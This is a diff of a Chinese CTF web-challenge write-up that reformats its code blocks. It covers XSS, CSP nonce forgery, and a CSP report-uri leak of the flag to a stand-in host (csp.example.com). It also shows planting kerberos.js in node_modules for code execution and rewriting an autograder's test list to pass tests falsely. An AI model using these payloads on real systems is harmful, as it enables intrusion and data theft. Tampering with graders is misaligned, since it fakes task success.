@@ -144,8 +144,8 @@
 </span></span></code></pre></div><h2 id="gift">gift</h2>
 <p>赛后学习@deltaclock师傅的思路，估计是非预期，就两步</p>
 <p>利用<code>admin</code>身份创建<code>gift</code></p>
-<pre tabindex="0"><code>window.open(&#34;https://gift.mc.ax/create/Infinity&#34;);
-</code></pre><p>在创建加载的时候登录，目的是更改用户名，因为生成<code>create</code>界面的时候会再次发送请求到<code>/api/info</code>获得用户名，但是<code>public</code>是使用<code>admin</code>创建的，然后又用户名存在html注入，所以存在外带的可能性</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>window.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;https://gift.mc.ax/create/Infinity&#34;</span>);
+</span></span></code></pre></div><p>在创建加载的时候登录，目的是更改用户名，因为生成<code>create</code>界面的时候会再次发送请求到<code>/api/info</code>获得用户名，但是<code>public</code>是使用<code>admin</code>创建的，然后又用户名存在html注入，所以存在外带的可能性</p>
 <p>对着大佬的poc改改（删了一些没有影响的东西方便理解 如下</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
 </span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span> <span style="color:#a6e22e">lang</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
@@ -227,8 +227,8 @@
 </span></span></code></pre></div><p>然后获得邀请链接，创建个账户使用后访问/flag即可</p>
 <h2 id="impossible-xss">impossible-xss</h2>
 <p>bot使用<code>.setJavaScriptEnabled</code>禁止js的执行</p>
-<pre tabindex="0"><code>await page.setJavaScriptEnabled(false);
-</code></pre><p><code>res.end</code>相较于<code>res.send</code>不会返回<code>Content-Type</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#a6e22e">setJavaScriptEnabled</span>(<span style="color:#66d9ef">false</span>);
+</span></span></code></pre></div><p><code>res.end</code>相较于<code>res.send</code>不会返回<code>Content-Type</code></p>
 <blockquote>
 <p>This means chrome will perform content sniffing on the response.</p>
 </blockquote>
@@ -259,9 +259,9 @@
 </span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;https://impossible-xss.mc.ax/?xss=&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">xss</span>)
 </span></span></code></pre></div><h2 id="recursive-csp">recursive-csp</h2>
 <p>csp中</p>
-<pre tabindex="0"><code>script-src &#39;nonce-$nonce&#39;
-</code></pre><p>如下可以绕过CSP，其中的<code>nonce</code>要和整个js语句hash出来的<code>nonce</code>相等</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-rust" data-lang="rust"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>script nonce<span style="color:#f92672">=&#39;</span><span style="color:#a6e22e">ZZZZZZZZ</span><span style="color:#f92672">&#39;&gt;</span>alert(<span style="color:#ae81ff">1</span>)<span style="color:#f92672">&lt;/</span>script<span style="color:#f92672">&gt;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">script</span><span style="color:#f92672">-</span><span style="color:#a6e22e">src</span> <span style="color:#e6db74">&#39;nonce-$nonce&#39;</span>
+</span></span></code></pre></div><p>如下可以绕过CSP，其中的<code>nonce</code>要和整个js语句hash出来的<code>nonce</code>相等</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">nonce</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;ZZZZZZZZ&#39;</span>&gt;<span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">1</span>)&lt;/<span style="color:#f92672">script</span>&gt;
 </span></span></code></pre></div><p>payload</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">crc</span> <span style="color:#a6e22e">from</span> <span style="color:#e6db74">&#34;crc/crc32&#34;</span>;
 </span></span><span style="display:flex;"><span>
@@ -289,17 +289,17 @@
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><h2 id="scorescope">scorescope</h2>
 <p>查看测试环境的变量</p>
-<pre tabindex="0"><code>import __main__
-def add(a, b):
-    raise BaseException(dir(__main__))
-</code></pre><p>利用通过测试</p>
-<pre tabindex="0"><code>import __main__
-
-__main__.tests = [&#39;test_add_positive&#39;] * 22
-
-def add(a, b):
-    return a+b
-</code></pre><h2 id="unfinished">unfinished</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> __main__
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add</span>(a, b):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">BaseException</span>(dir(__main__))
+</span></span></code></pre></div><p>利用通过测试</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> __main__
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>__main__<span style="color:#f92672">.</span>tests <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;test_add_positive&#39;</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">22</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add</span>(a, b):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> a<span style="color:#f92672">+</span>b
+</span></span></code></pre></div><h2 id="unfinished">unfinished</h2>
 <p>没给注册功能，但后续的操作需要经过登录中间件验证，查看验证中间件如下</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">requiresLogin</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">next</span>) =&gt; {
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">user</span>) {
@@ -321,42 +321,42 @@ def add(a, b):
 </blockquote>
 <p>在配置中使用<code>--create-dirs</code>去生成<code>.node_modules</code>目录，然后保存名为<code>kerberos.js</code>文件，即可在node崩溃重启后执行自定义的js文件</p>
 <p>作者的想法是利用telnet 去向<code>MongoDB</code>进行对应协议 的请求 然后查询flag后保存到本地 然后使用配置携带发送</p>
-<pre tabindex="0"><code>const BSON = require(&#34;bson&#34;);
-const fs = require(&#34;fs&#34;);
-
-const doc = {
-  find: &#34;flag&#34;,
-  $db: &#34;secret&#34;
-};
-const data = BSON.serialize(doc);
-
-let beginning = Buffer.from(
-  &#34;000000000000000000000000DD0700000000000000&#34;,
-  &#34;hex&#34;
-);
-let full = Buffer.concat([beginning, data]);
-
-full.writeUInt32LE(full.length, 0);
-fs.writeFileSync(&#34;bson.bin&#34;, full);
-</code></pre><h2 id="codebox">codebox</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">BSON</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;bson&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">fs</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;fs&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">doc</span> <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">find</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;flag&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">$db</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;secret&#34;</span>
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">BSON</span>.<span style="color:#a6e22e">serialize</span>(<span style="color:#a6e22e">doc</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">beginning</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">from</span>(
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;000000000000000000000000DD0700000000000000&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;hex&#34;</span>
+</span></span><span style="display:flex;"><span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">full</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">Buffer</span>.<span style="color:#a6e22e">concat</span>([<span style="color:#a6e22e">beginning</span>, <span style="color:#a6e22e">data</span>]);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">full</span>.<span style="color:#a6e22e">writeUInt32LE</span>(<span style="color:#a6e22e">full</span>.<span style="color:#a6e22e">length</span>, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">writeFileSync</span>(<span style="color:#e6db74">&#34;bson.bin&#34;</span>, <span style="color:#a6e22e">full</span>);
+</span></span></code></pre></div><h2 id="codebox">codebox</h2>
 <p>后端中的CSP可控</p>
-<pre tabindex="0"><code>    const csp = [
-        &#34;default-src &#39;none&#39;&#34;,
-        &#34;style-src &#39;unsafe-inline&#39;&#34;,
-        &#34;script-src &#39;unsafe-inline&#39;&#34;,
-    ];
-
-    if (images.length) {
-        csp.push(`img-src ${images.join(&#39; &#39;)}`);
-    }
-
-    res.header(&#39;Content-Security-Policy&#39;, csp.join(&#39;; &#39;));
-</code></pre><blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>    <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">csp</span> <span style="color:#f92672">=</span> [
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;default-src &#39;none&#39;&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;style-src &#39;unsafe-inline&#39;&#34;</span>,
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;script-src &#39;unsafe-inline&#39;&#34;</span>,
+</span></span><span style="display:flex;"><span>    ];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">images</span>.<span style="color:#a6e22e">length</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">csp</span>.<span style="color:#a6e22e">push</span>(<span style="color:#e6db74">`img-src </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">images</span>.<span style="color:#a6e22e">join</span>(<span style="color:#e6db74">&#39; &#39;</span>)<span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Content-Security-Policy&#39;</span>, <span style="color:#a6e22e">csp</span>.<span style="color:#a6e22e">join</span>(<span style="color:#e6db74">&#39;; &#39;</span>));
+</span></span></code></pre></div><blockquote>
 <p>flag是通过innerHTML直接写入到DOM里，如果在CSP header里指定<code> require-trusted-types-for 'script'</code> ，这个 innerHTML 的赋值就会因为字符串没有经过 Trusted-Types 处理而违反CSP规则。</p>
 <p>违反CSP规则可以通过 report-uri 或者 report-to 来上报给指定的地址，上报的内容会包含一小部分错误详情。</p>
 <p>构造如下 payload 并访问：</p>
-<pre tabindex="0"><code>https://codebox.mc.ax/?code=&lt;img+src=&#34;111%3brequire-trusted-types-for+&#39;script&#39;%3breport-uri+http://csp.example.com%3b&#34;&gt;
-</code></pre></blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">https://codebox.mc.ax/?code=&lt;img+src=&#34;111%3brequire-trusted-types-for+&#39;script&#39;%3breport-uri+http://csp.example.com%3b&#34;&gt;
+</span></span></span></code></pre></div></blockquote>
 <blockquote>
 <p>前端的 <code>code</code> 是通过浏览器的 URL 类 searchParams.get() 获取的，这个方法在存在多个相同参数的情况下取第一个。而后端取 <code>req.query.code</code> 的时候，express.js 取的是最后一个。</p>
 </blockquote>
